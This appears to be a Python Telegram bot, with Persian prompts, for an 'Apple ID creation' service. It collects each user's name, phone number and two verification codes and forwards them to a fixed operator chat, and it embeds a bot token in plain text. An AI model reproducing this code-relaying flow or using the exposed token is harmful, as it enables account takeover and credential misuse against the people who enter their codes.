from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, CallbackContext

# مراحل مختلف گفتگو
NAME, PHONE, CODE, VERIFY_CODE, FINAL_STEP = range(5)

# توکن ربات
TOKEN = '7390416084:AAHRxrg_ipck3DCnwXOyGYRaWlCp2UBJF1Y'

# شناسه چت اپراتور
OPERATOR_CHAT_ID = 6548746173

# دکمه‌های موجود در گفتگو
start_buttons = [['ساخت اپل آیدی']]

# شروع گفتگو
async def start(update: Update, context: CallbackContext) -> int:
    reply_markup = ReplyKeyboardMarkup(start_buttons, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text('لطفاً دکمه زیر را فشار دهید تا فرآیند ساخت اپل آیدی شروع شود.', reply_markup=reply_markup)
    return NAME

# دریافت نام و نام خانوادگی
async def get_name(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text('لطفاً نام و نام خانوادگی خود را وارد کنید:')
    return PHONE

# دریافت شماره تلفن
async def get_phone(update: Update, context: CallbackContext) -> int:
    context.user_data['name'] = update.message.text
    await update.message.reply_text('لطفاً شماره تلفن خود را وارد کنید:')
    return CODE

# ارسال اطلاعات به اپراتور و درخواست کد تایید
async def send_to_operator(update: Update, context: CallbackContext) -> int:
    context.user_data['phone'] = update.message.text
    user_info = f"اطلاعات جدید:\nنام: {context.user_data['name']}\nتلفن: {context.user_data['phone']}"
    
    try:
        # ارسال اطلاعات به اپراتور
        await context.bot.send_message(chat_id=OPERATOR_CHAT_ID, text=user_info)
        await update.message.reply_text('اطلاعات ارسال شد. لطفاً منتظر تایید اپراتور باشید.')
        await update.message.reply_text('لطفاً کد تایید شده را وارد کنید:')
        return VERIFY_CODE
    except Exception as e:
        await update.message.reply_text(f"خطا در ارسال پیام به اپراتور: {e}")
        return ConversationHandler.END

# دریافت کد تایید از کاربر
async def get_verification_code(update: Update, context: CallbackContext) -> int:
    context.user_data['code'] = update.message.text
    await context.bot.send_message(chat_id=OPERATOR_CHAT_ID, text=f"کد تایید دریافت شده از کاربر: {context.user_data['code']}")
    
    await update.message.reply_text('کد تایید ارسال شد. لطفاً منتظر تایید اپراتور باشید.')
    await update.message.reply_text('لطفاً کد جدید را وارد کنید:')
    return FINAL_STEP

# ارسال کد نهایی به اپراتور و پایان عملیات
async def final_step(update: Update, context: CallbackContext) -> int:
    context.user_data['new_code'] = update.message.text
    await context.bot.send_message(chat_id=OPERATOR_CHAT_ID, text=f"کد نهایی دریافت شده از کاربر: {context.user_data['new_code']}")
    
    await update.message.reply_text('کد نهایی ارسال شد. لطفاً منتظر تایید اپراتور باشید.')
    await update.message.reply_text('عملیات به پایان رسید. لطفاً فایل نهایی را از اپراتور دریافت کنید.')
    return ConversationHandler.END

# لغو عملیات
async def cancel(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text('درخواست شما لغو شد.')
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    # تعریف گفتگو
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_to_operator)],
            VERIFY_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_verification_code)],
            FINAL_STEP: [MessageHandler(filters.TEXT & ~filters.COMMAND, final_step)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)

    application.run_polling()

if __name__ == '__main__':
    main()
